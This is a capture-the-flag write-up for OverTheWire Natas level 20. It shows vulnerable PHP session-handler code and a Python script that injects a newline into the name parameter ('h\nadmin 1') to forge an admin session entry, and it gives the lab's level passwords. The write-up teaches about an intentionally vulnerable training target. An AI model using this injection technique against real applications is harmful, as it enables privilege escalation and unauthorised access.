# Natas 19 - Natas 20
    Username  : natas20
    password  : p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
    URL       : http://natas20.natas.labs.overthewire.org

# Solution
Take a look at the source code : 
```
<?php

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */
/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}
/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}
function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode() ?: "";
}
function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
    return true;
}
/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}
session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}
print_credentials();
$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}
?>
```
Here we got lots of code but, let me simplify that for you. First, because of the debug($msg) function, we can get more details about the management of the sessions.

For exemple, if you enter natas in the name field, submit it and change your URL with http://natas20.natas.labs.overthewire.org/index.php?debug you should get debug information :

<img width="1911" height="606" alt="image" src="https://github.com/user-attachments/assets/a5978417-8139-434d-a8b6-0760d72c5266" />

Python script for the attack : 
```
import requests
import re

username = 'natas20'
password = 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username

session = requests. Session()

response = session.get(url, auth = (username, password) )
print(response. text)
print("="*80)

response = session. post(url, data = {"name": "h\nadmin 1"}, auth = (username, password) )
print(response.text)
print("="*80)

response = session.get(url, auth = (username, password) )
print(response.text)
print("="*80)
```
We found out that multiple sessions in a single script uses a single file . one session is used for creating the file another for pushing the information into it and the last one for retraving the password

# Password
    BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
